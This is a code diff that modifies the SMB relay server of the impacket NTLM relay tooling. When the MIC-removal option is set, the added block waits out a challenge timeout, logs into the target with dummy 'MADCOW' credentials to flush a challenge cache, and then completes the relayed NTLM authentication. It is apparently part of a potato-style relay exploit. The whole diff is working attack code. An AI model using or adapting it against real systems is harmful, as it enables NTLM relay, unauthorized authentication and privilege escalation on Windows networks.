@@ -306,6 +306,22 @@ class SMBRelayServer(Thread):
                     securityBlob = respToken2.getData()
 
                 if self.config.remove_mic:
+                    from impacket.smbconnection import SMBConnection
+                    d1 = 315
+                    d2 = 5
+                    print('[GPOTATO] WAITING %s SECONDS FOR CHALLENGE TIMEOUT' % (d1))
+                    time.sleep(d1)
+                    print('[GPOTATO] FLUSHING CHALLENGE CACHE NOW')
+                    try:
+                        tempSmbConAddress = self.target.netloc.split(':')[0]
+                        tempSmbCon = SMBConnection(tempSmbConAddress, tempSmbConAddress)
+                        tempSmbCon.login('MADCOW', 'MADCOW', 'MADCOW')
+                        tempSmbCon.close()
+                    except Exception as e:
+                        print('[GPOTATO] DONE: %s' % str(e))
+                    print('[GPOTATO] WAITING ADDITIONAL %s SECONDS' % (d2))
+                    time.sleep(d2)
+                    print('[GPOTATO] AUTHENTICATING...')
                     clientResponse, errorCode = self.do_ntlm_auth(client, token,
                                                                   connData['CHALLENGE_MESSAGE']['challenge'])
                 else:
